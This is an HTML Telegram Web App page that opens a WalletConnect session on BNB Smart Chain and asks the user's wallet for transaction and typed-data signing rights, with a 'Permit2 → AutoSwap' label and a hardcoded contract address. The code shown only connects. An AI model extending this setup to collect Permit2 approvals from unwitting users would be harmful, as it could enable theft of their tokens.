<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>WalletConnect AutoSwap</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #17212b;
      color: #fff;
      text-align: center;
      padding: 20px;
    }
    #qrcode {
      margin-top: 20px;
    }
    #status {
      margin-top: 20px;
      font-weight: 600;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <h1>WalletConnect AutoSwap</h1>
  <canvas id="qrcode"></canvas>
  <div id="status">Инициализация...</div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.ready();

    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      chainId: "eip155:56",
      rpcUrl: "https://bsc-dataseed.binance.org",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
    };

    const status = document.getElementById("status");
    const qrCanvas = document.getElementById("qrcode");

    function setStatus(msg, isError = false) {
      status.textContent = msg;
      status.style.color = isError ? "#ff4d4d" : "#66bb6a";
    }

    async function runApp() {
      try {
        const SignClient = window.WalletConnectSignClient.default;
        const client = await SignClient.init({
          projectId: CONFIG.projectId,
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "AutoSwap WebApp",
            description: "Permit2 → AutoSwap on BSC",
            url: window.location.href,
            icons: [],
          },
        });

        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction", "eth_signTypedData", "eth_chainId"],
              chains: [CONFIG.chainId],
              events: ["chainChanged", "accountsChanged"],
            },
          },
        });

        if (uri) {
          QRCode.toCanvas(qrCanvas, uri, { width: 220, margin: 1 }, err => {
            if (err) {
              setStatus("Ошибка генерации QR-кода", true);
              console.error(err);
            } else {
              setStatus("Отсканируйте QR код через Trust Wallet или MetaMask");
            }
          });
        }

        const session = await approval();
        if (!session || !session.topic) {
          throw new Error("Не удалось установить сессию");
        }

        setStatus("✅ Сессия установлена! Готово к подписи");
        // тут можно вызвать permit или swap вызов, если ты хочешь сразу после подключения
      } catch (err) {
        console.error("Ошибка:", err);
        setStatus("Ошибка: " + (err.message || err), true);
      }
    }

    runApp();
  </script>
</body>
</html>
